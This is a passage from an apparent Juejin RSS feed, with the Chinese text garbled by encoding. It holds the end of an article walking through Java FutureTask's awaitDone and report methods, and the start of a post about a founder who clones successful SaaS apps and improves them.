    <span class="hljs-comment">// æ‹¿åˆ°å½“å‰ FutureTaskçš„çŠ¶æ€</span>
    int s = state;
    <span class="hljs-comment">// æ»¡è¶³è¿™ä¸ªçŠ¶æ€ï¼Œè¯´æ˜å¯èƒ½è¿˜æ²¡æœ‰è¿”å›ç»“æœ</span>
    if (s &lt;= COMPLETING){
        <span class="hljs-comment">// æ²¡åˆ°completingï¼Œè¿›è¡Œé˜»å¡ï¼ŒæŒ‚èµ·çº¿ç¨‹ï¼Œç­‰å¾…æ‹¿ç»“æœ</span>
        s = <span class="hljs-built_in">awaitDone</span>(false, <span class="hljs-number">0</span>L);
    }
    <span class="hljs-comment">// æ‹¿åˆ°è¿”å›ç»“æœï¼Œæƒ³è¦æ‹¿åˆ°æ­£å¸¸çš„è¿”å›ç»“æœï¼Œä¼ è¿›å»çš„så‚æ•°å¾—ä¸º normal</span>
    return <span class="hljs-built_in">report</span>(s);
}
</code></pre>
<h3 data-id="heading-8">6ã€awaitDone()æ–¹æ³•</h3>
<p>è¿™ä¸ªæ–¹æ³•ï¼Œä¸»è¦æ˜¯å…¶ä»–çº¿ç¨‹è°ƒç”¨ï¼Œä¸æ˜¯å½“å‰ FutureTaskè°ƒç”¨ï¼Œä¸è¦ææ··äº†</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/** æŒ‚èµ·çº¿ç¨‹ï¼Œè¿”å›ç»“æœæ˜¯intç±»å‹
* çº¿ç¨‹ç­‰å¾…ä»»åŠ¡æ‰§è¡Œç»“æŸï¼Œç­‰å¾…ä»»åŠ¡æ‰§è¡Œçš„çŠ¶æ€å˜ä¸ºå¤§äº CompletingçŠ¶æ€
* timedå‚æ•°ï¼šbooleanå€¼ï¼Œæ˜¯å¦ä¼ é€’æ—¶é—´å‚æ•°
* nanos: æ—¶é—´æˆ³
*/</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">awaitDone</span><span class="hljs-params">(<span class="hljs-type">boolean</span> timed, <span class="hljs-type">long</span> nanos)</span><span class="hljs-keyword">throws</span> InterruptedException {
    <span class="hljs-comment">// å¼€å§‹æ—¶é—´ï¼Œç”¨äºè®¡ç®—è¶…æ—¶</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> <span class="hljs-number">0L</span>;
    <span class="hljs-comment">// ç­‰å¾…èŠ‚ç‚¹</span>
    <span class="hljs-type">WaitNode</span> <span class="hljs-variable">q</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// èŠ‚ç‚¹æ˜¯å¦å·²å…¥é˜Ÿåˆ—</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">queued</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-comment">// è‡ªæ—‹å¾ªç¯</span>
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">int</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> state;
        <span class="hljs-keyword">if</span> (s &gt; COMPLETING) { <span class="hljs-comment">// FutureTaskçš„çŠ¶æ€å¤§äºCANCELLEDè¯´æ˜ä»»åŠ¡å·²ç»æ‰§è¡Œç»“æŸäº†</span>
            <span class="hljs-keyword">if</span> (q != <span class="hljs-literal">null</span>){ <span class="hljs-comment">// å¦‚æœè®¾ç½®è¿‡waitNodeï¼Œå°†threadå€¼ç½®ä¸º null</span>
                q.thread = <span class="hljs-literal">null</span>;
            }
            <span class="hljs-keyword">return</span> s; <span class="hljs-comment">// è¿”å›çŠ¶æ€å€¼</span>
        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s == COMPLETING){ <span class="hljs-comment">// å¦‚æœä»»åŠ¡çš„çŠ¶æ€å¤„äºcompleting</span>
            <span class="hljs-comment">// è®©å‡ºCPUæ—¶é—´ç‰‡ , completingçš„æŒç»­æ—¶é—´éå¸¸çŸ­ï¼Œåªéœ€è¦è®©å‡ºcpuæ—¶é—´ç‰‡å³å¯ï¼Œä¸éœ€è¦ç¡çœ </span>
            Thread.<span class="hljs-keyword">yield</span>();
        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Thread.interrupted()) { <span class="hljs-comment">// åˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦ä¸­æ–­</span>
            <span class="hljs-comment">// å·²ç»ä¸­æ–­ï¼Œå°†å½“å‰èŠ‚ç‚¹ä»waitersä¸­ç§»é™¤</span>
            removeWaiter(q);
            <span class="hljs-comment">// æŠ›å‡ºä¸­æ–­å¼‚å¸¸</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InterruptedException</span>();
        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// èŠ‚ç‚¹ä¸º null</span>
            <span class="hljs-keyword">if</span> (timed &amp;&amp; nanos &lt;= <span class="hljs-number">0L</span>){
                 <span class="hljs-comment">// è®¾ç½®äº†æ—¶é—´ å¹¶ä¸” ç­‰å¾…æ—¶é—´ä¹Ÿåˆ°æœŸäº†ï¼Œç›´æ¥è¿”å›</span>
                 <span class="hljs-keyword">return</span> s;
            }
            <span class="hljs-comment">// æ—¶é—´æ²¡åˆ°ï¼Œnewä¸€ä¸ªwaitNodeèŠ‚ç‚¹å‡ºæ¥</span>
            q = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WaitNode</span>();
        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!queued){ <span class="hljs-comment">// èŠ‚ç‚¹æ²¡å…¥é˜Ÿåˆ—</span>
            <span class="hljs-comment">// é€šè¿‡ CAS ï¼Œç”¨å¤´æ’æ³• é“¾æ¥ä¸Šwaitersï¼Œå¹¶ä¸”å°†waitersçš„å€¼è®¾ç½®ä¸º q</span>
            queued = WAITERS.weakCompareAndSet(<span class="hljs-built_in">this</span>, q.next = waiters, q);
        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (timed) { <span class="hljs-comment">// æ ¹æ®æ—¶é—´æ¥è·å–ç»“æœ</span>
            <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> parkNanos;
            <span class="hljs-keyword">if</span> (startTime == <span class="hljs-number">0L</span>) { <span class="hljs-comment">// å¤´ä¸€æ¬¡è¿›æ¥ï¼Œè®¾ç½®startTimeï¼Œå–ç³»ç»Ÿæ—¶é—´</span>
                startTime = System.nanoTime();
                <span class="hljs-keyword">if</span> (startTime == <span class="hljs-number">0L</span>){
                    startTime = <span class="hljs-number">1L</span>;
                }
                parkNanos = nanos;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// ç¬¬äºŒæ¬¡è¿›æ¥ï¼Œè®¡ç®—è·Ÿå¤´ä¸€æ¬¡è¿›æ¥çš„å·®å€¼</span>
                <span class="hljs-type">long</span> <span class="hljs-variable">elapsed</span> <span class="hljs-operator">=</span> System.nanoTime() - startTime;
                <span class="hljs-keyword">if</span> (elapsed &gt;= nanos) { <span class="hljs-comment">// åˆ¤æ–­å·®å€¼æ˜¯ä¸æ˜¯å¤§äºç­‰äºä¼ å‚è¿›æ¥çš„å€¼</span>
                    removeWaiter(q); <span class="hljs-comment">// ç§»é™¤æ‰é˜»å¡èŠ‚ç‚¹</span>
                    <span class="hljs-keyword">return</span> state; <span class="hljs-comment">// è¿”å›çŠ¶æ€ç»“æœ</span>
                }
                <span class="hljs-comment">// ç¬¬äºŒæ¬¡è¿›æ¥è¿˜æ²¡åˆ°ç­‰å¾…çš„æ—¶é—´ï¼Œæ›´æ–°ç­‰å¾…çš„æ—¶é—´ç»“æœ</span>
                parkNanos = nanos - elapsed;
            }
            <span class="hljs-keyword">if</span> (state &lt; COMPLETING){ <span class="hljs-comment">// ç¬¬äºŒæ¬¡è¿›æ¥ï¼Œæ—¶é—´æ²¡åˆ°ï¼Œå¹¶ä¸”FutureTaskçš„ä»»åŠ¡è¿˜æ²¡åˆ° CompletingçŠ¶æ€</span>
                <span class="hljs-comment">// æŒ‡å®šæ—¶é—´æŒ‚èµ·çº¿ç¨‹</span>
                LockSupport.parkNanos(<span class="hljs-built_in">this</span>, parkNanos);
            }
        }<span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// æŒ‚èµ·çº¿ç¨‹</span>
            LockSupport.park(<span class="hljs-built_in">this</span>);
        }
    }
}

<span class="hljs-comment">// å†…éƒ¨ç±»èŠ‚ç‚¹</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WaitNode</span> {
    <span class="hljs-keyword">volatile</span> Thread thread;
    <span class="hljs-keyword">volatile</span> WaitNode next;
    <span class="hljs-comment">// åˆå§‹åŒ–threadä¸ºå½“å‰çº¿ç¨‹</span>
    WaitNode() { thread = Thread.currentThread(); }
}
</code></pre>
<p>è¿™é‡Œåªæ˜¯æ¶‰åŠåˆ°æŒ‚èµ·ï¼Œç­‰run()æ–¹æ³•æ‰§è¡Œå®Œæ¯•ï¼Œä¼šå”¤é†’waitersé‡Œçš„æ‰€æœ‰èŠ‚ç‚¹</p>
<h3 data-id="heading-9">7ã€report()æ–¹æ³•</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> V <span class="hljs-title function_">report</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span> <span class="hljs-keyword">throws</span> ExecutionException {
    <span class="hljs-type">Object</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> outcome;
    <span class="hljs-keyword">if</span> (s == NORMAL){ <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æ˜¯normalçŠ¶æ€</span>
        <span class="hljs-comment">// è¯´æ˜æ­£å¸¸ç»“æŸï¼Œè¿”å›ç»“æœ</span>
        <span class="hljs-keyword">return</span> (V)x;
    }
    <span class="hljs-comment">// éæ­£å¸¸ç»“æŸ cancelled / ä¸­æ–­ æŠ¥å¼‚å¸¸</span>
    <span class="hljs-keyword">if</span> (s &gt;= CANCELLED){
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CancellationException</span>();
    }
    <span class="hljs-comment">// å¼‚å¸¸ç»“æŸ</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutionException</span>((Throwable)x);
}
</code></pre>
<h2 data-id="heading-10">å››ã€æ€»ç»“</h2>
<p>1ã€å½“å‰ FutureTaskæ–¹æ³•å…·ä½“ä¼šæ‰§è¡Œrun()æ–¹æ³• --&gt; å°è£…äº† Callable --&gt; å…·ä½“æ‰§è¡Œçš„æ˜¯callableçš„callæ–¹æ³• --&gt; å”¤é†’å…¶ä»–é˜»å¡çº¿ç¨‹</p>
<p>2ã€å…¶ä»–çº¿ç¨‹è°ƒç”¨get()æ–¹æ³• --&gt; ä¼šæ‰”åˆ°watierså•å‘é“¾è¡¨ç­‰å¾…é˜Ÿåˆ—é‡Œï¼Œä¸¤è€…é…åˆ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[0 ç¼–ç¨‹åŸºç¡€ï¼Œä»–é â€œå…‹éš†â€çˆ†æ¬¾ Appï¼Œç‹‚æ½ 3.5 ä¸‡ç¾å…ƒ/æœˆ]]></title>    <link>https://juejin.cn/post/7583598943071338531</link>    <guid>https://juejin.cn/post/7583598943071338531</guid>    <pubDate>2025-12-15T05:31:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583598943071338531" data-draft-id="7583667970736570368" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="0 ç¼–ç¨‹åŸºç¡€ï¼Œä»–é â€œå…‹éš†â€çˆ†æ¬¾ Appï¼Œç‹‚æ½ 3.5 ä¸‡ç¾å…ƒ/æœˆ"/> <meta itemprop="keywords" content="äº§å“"/> <meta itemprop="datePublished" content="2025-12-15T05:31:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¥­ç‰¹ç¨€AI"/> <meta itemprop="url" content="https://juejin.cn/user/888061124427384"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            0 ç¼–ç¨‹åŸºç¡€ï¼Œä»–é â€œå…‹éš†â€çˆ†æ¬¾ Appï¼Œç‹‚æ½ 3.5 ä¸‡ç¾å…ƒ/æœˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/888061124427384/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¥­ç‰¹ç¨€AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T05:31:00.000Z" title="Mon Dec 15 2025 05:31:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">0 ç¼–ç¨‹åŸºç¡€é  â€œå…‹éš† + 1% ä¼˜åŒ–â€ ç­–ç•¥ï¼Œ3 å¹´åšåˆ° AI åº”ç”¨æœˆå…¥ 3.5 ä¸‡ç¾é‡‘ï¼Ÿ</h2>
<p>Samuelï¼Œå‰éªŒå…‰å¸ˆï¼Œç°åœ¨æ˜¯ 3 ä¸ª SaaS åº”ç”¨çš„åˆ›å§‹äººï¼Œæœˆå…¥ 3.5 ä¸‡ç¾é‡‘ã€‚</p>
<p>ä½† Samuel çš„ç‰¹åˆ«ä¹‹å¤„åœ¨äºï¼Œä»–æŠŠ â€œ1% æ”¹è¿›â€ åšåˆ°äº†æè‡´ï¼Œ<strong>ç”¨æœ€å°çš„æ”¹åŠ¨ï¼Œæ’¬åŠ¨æœ€å¤§çš„å¢é•¿</strong>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b197496779d43a09bd4ac80ca9461f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aWt54m556iAQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766381460&amp;x-signature=v%2Bxcm2mr%2FBV3YBTDq5weYQYpRkg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">èƒŒæ™¯ä¸è½¬æŠ˜ï¼š</h2>
<p>Samuel çš„æ•…äº‹ï¼Œè¯´èµ·æ¥æœ‰ç‚¹ â€œé‡ç”Ÿâ€ã€‚</p>
<ul>
<li><strong>èµ·ç‚¹ï¼š</strong> ä»–ä»¥å‰æ˜¯ä¸ªéªŒå…‰å¸ˆï¼Œæ¯å¤©å’Œé•œç‰‡æ‰“äº¤é“ï¼Œä¸æ‡‚ä»£ç æ˜¯å•¥ã€‚</li>
<li><strong>å¼¯è·¯ï¼š</strong> ä¸ºäº†æ”¹é€ ä¸€ä¸ª Instagram å°å·¥å…·ï¼Œä»–å¼€å§‹åœ¨ YouTube ä¸Šè‡ªå­¦ç¼–ç¨‹ã€‚ç»“æœå‘¢ï¼Ÿ &gt; <strong>Samuelï¼š</strong> â€œæŠ¥äº†ä¸ª 15 å°æ—¶çš„è¯¾ç¨‹ï¼Œå­¦äº†ä¸€å †æ²¡ç”¨çš„ä¸œè¥¿ï¼Œå·®ç‚¹æŠŠè‡ªå·±åŠé€€ã€‚â€</li>
<li><strong>è½¬æŠ˜ï¼š</strong> åæ¥ä»–å‘ç°ï¼Œ<strong>æœ€å¥½çš„å­¦ä¹ æ–¹å¼æ˜¯ â€œä»¥ç”¨ä¿ƒå­¦â€</strong> ã€‚å­¦åˆ°ä¸€ä¸ªæ–°çŸ¥è¯†ç‚¹ï¼Œç«‹åˆ»ç”¨åœ¨è‡ªå·±çš„é¡¹ç›®ä¸Šã€‚ &gt; <strong>Samuelï¼š</strong> â€œå¦‚æœåªæ˜¯çœ‹è§†é¢‘ï¼Œä½ ä¼šè¿·å¤±åœ¨å„ç§è¯­æ³•ç»†èŠ‚é‡Œï¼Œæ ¹æœ¬ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦å­¦ã€‚â€</li>
</ul>
<p>ä»–ç¬¬ä¸€æ¬¡åˆ›ä¸šï¼Œæƒ³åšä¸€ä¸ªç‰›é€¼çš„ LinkedIn æ•°æ®æŠ“å–å·¥å…·ï¼ˆUsimusï¼‰ã€‚ä½†ç°å®ç»™äº†ä»–ä¸€è®°é‡å‡»ã€‚</p>
<blockquote>
<p><strong>Samuelï¼š</strong> â€œå½“æ—¶å¸‚åœºä¸Šå·²ç»æœ‰ Apolloã€LimbList è¿™æ ·çš„å·¨å¤´äº†ï¼Œæˆ‘æ ¹æœ¬æ²¡æ³•å’Œä»–ä»¬ç«äº‰ã€‚â€</p>
</blockquote>
<p>è¿™æ¬¡å¤±è´¥è®©ä»–æ˜ç™½ï¼š<strong>åˆ›ä¸šä¸èƒ½é—­é—¨é€ è½¦ï¼Œè¦å…ˆæ‰¾åˆ°å·²ç»è¢«å¸‚åœºéªŒè¯çš„ â€œå¥½è‹—å­â€</strong> ã€‚</p>
<h2 data-id="heading-2">å®æ“æ‹†è§£ï¼š</h2>
<p>Samuel çš„æ–¹æ³•è®ºï¼Œæ€»ç»“èµ·æ¥å°±ä¸€å¥è¯ï¼š<strong>æ‰¾åˆ°ä¸€ä¸ªå·²ç»æˆåŠŸçš„ Appï¼Œç„¶åç”¨ AI æ”¹è¿› 1%</strong> ã€‚</p>
<p>ä½ å¯èƒ½ä¼šè¯´ï¼šè¿™ä¸å°±æ˜¯ â€œCopy from Americaâ€ å—ï¼Ÿä½† Samuel çš„å‰å®³ä¹‹å¤„åœ¨äºï¼Œä»–æŠŠæ¯ä¸ªç¯èŠ‚éƒ½åšåˆ°äº†æè‡´ã€‚</p>
<h3 data-id="heading-3">Step 1ï¼šTwitter ç¤¾åŒº â€œè¹²â€ çˆ†æ¬¾</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/143c1c0db5ff478fafdf2d93248b7776~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aWt54m556iAQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766381460&amp;x-signature=qimnyJorNUPLDrs%2F1cpg2EFmwmw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2261a2181a344600ade1769bb44906ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aWt54m556iAQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766381460&amp;x-signature=BmE5FPytFPDE8u10NT6QTc%2Fg94E%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>è§¦å‘åœºæ™¯ï¼š</strong> æ¯å¤©ä¸Šç­æ‘¸é±¼ / ä¸‹ç­åˆ·æ‰‹æœºæ—¶</li>
<li><strong>å…·ä½“åŠ¨ä½œï¼š</strong> åˆ· Twitterï¼Œå…³æ³¨ solopreneurã€build in public ç­‰è¯é¢˜</li>
<li><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong> çœ‹åˆ°æ„Ÿå…´è¶£çš„äº§å“ï¼Œå…ˆ Mark ä¸‹æ¥ã€‚<strong>å¿…é¡»æ»¡è¶³ 4 ä¸ªæ¡ä»¶</strong>ï¼š</li>
</ul>
<ol>
<li>
<p><strong>è‡ªå·±ä¼šç”¨ï¼š</strong> ç¡®ä¿å¯¹äº§å“æœ‰çƒ­æƒ…ã€‚<br/>
<strong>Samuelï¼š</strong> â€œå¦‚æœè‡ªå·±éƒ½ä¸å–œæ¬¢ï¼Œæ ¹æœ¬æ²¡åŠ¨åŠ›é•¿æœŸåšä¸‹å»ã€‚â€</p>
</li>
<li>
<p><strong>å·²ç»æœ‰äººåœ¨ç”¨ï¼š</strong> æœ€å¥½èƒ½çœ‹åˆ°åˆ›å§‹äººåˆ†äº«çš„ MRR æˆªå›¾ã€‚<br/>
<strong>Samuelï¼š</strong> â€œMRR æˆªå›¾æ˜¯æœ€ç›´æ¥çš„è¯æ®ï¼Œæ¯”ä»€ä¹ˆéƒ½ç®¡ç”¨ã€‚è¿™å¹´å¤´ï¼Œè°è¿˜ä¸ä¼šå¹ç‰›é€¼ï¼Ÿâ€</p>
</li>
<li>
<p><strong>æ²¡æ€ä¹ˆæ‰“å¹¿å‘Šï¼š</strong> è¯´æ˜äº§å“æœ‰è‡ªç„¶éœ€æ±‚ï¼Œä¸ç”¨ç ¸é’±ä¹Ÿèƒ½å¢é•¿ã€‚</p>
</li>
<li>
<p><strong>è¶³å¤Ÿç®€å•ï¼š</strong> ä»£ç é‡å°‘ï¼Œå®¹æ˜“ç»´æŠ¤ï¼Œä¸ä¼šæŠŠè‡ªå·±ç´¯æ­»ã€‚</p>
</li>
</ol>
<ul>
<li>
<p><strong>åä¾‹/å‘ï¼š</strong> åˆ«é€‰å¤ªå¤æ‚çš„äº§å“ï¼Œå¦åˆ™å…‰ç»´æŠ¤å°±å¤Ÿä½ å–ä¸€å£¶çš„ã€‚<br/>
<strong>Samuelï¼š</strong> â€œUsimus å°±æ˜¯ä¸ªåä¾‹ï¼ŒåŠŸèƒ½å¤ªå¤šï¼ŒæŠ€æœ¯æ ˆå¤ªæ·±ï¼ŒæŠŠè‡ªå·±å‘æƒ¨äº†ã€‚â€</p>
</li>
<li>
<p><strong>å¯å¤åˆ¶æ¨¡æ¿ï¼š</strong></p>
</li>
</ul>
<ol>
<li>
<p>æ‰“å¼€ Twitterï¼Œæœç´¢ â€œsolopreneur MRRâ€</p>
</li>
<li>
<p>æ¯å¤©èŠ± 30 åˆ†é’Ÿï¼Œè®°å½• 5 ä¸ªä½ æ„Ÿå…´è¶£ï¼Œä¸”æ»¡è¶³ä»¥ä¸Šæ¡ä»¶çš„äº§å“</p>
</li>
</ol>
<h3 data-id="heading-4">Step 2ï¼šç”¨ Ahrefs â€œæ‰’â€ ç«å“æµé‡</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7012bafab0848a3a26c00e0c162af95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aWt54m556iAQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766381460&amp;x-signature=iWjWRXFPKMIscbnf90zPIM2OtYo%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>è§¦å‘åœºæ™¯ï¼š</strong> æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³ Step 1 æ¡ä»¶çš„äº§å“å</p>
</li>
<li>
<p><strong>å…·ä½“åŠ¨ä½œï¼š</strong> æ‰“å¼€ Ahrefsï¼Œè¾“å…¥ç›®æ ‡ç½‘ç«™ï¼ŒæŸ¥çœ‹æµé‡æ¥æº</p>
</li>
<li>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
</li>
<li>
<ul>
<li>
<p><strong>SEO + å¹¿å‘Šï¼š</strong> è¯´æ˜äº§å“æœ‰å¢é•¿æ½œåŠ›ï¼Œå€¼å¾— All in</p>
</li>
<li>
<p><strong>ä¸»è¦é  SEOï¼š</strong> ä¹Ÿèƒ½åšï¼Œä½†éœ€è¦é•¿æœŸæŠ•å…¥ï¼ŒçŸ­æœŸå¯èƒ½çœ‹ä¸åˆ°æ•ˆæœ</p>
</li>
</ul>
</li>
<li>
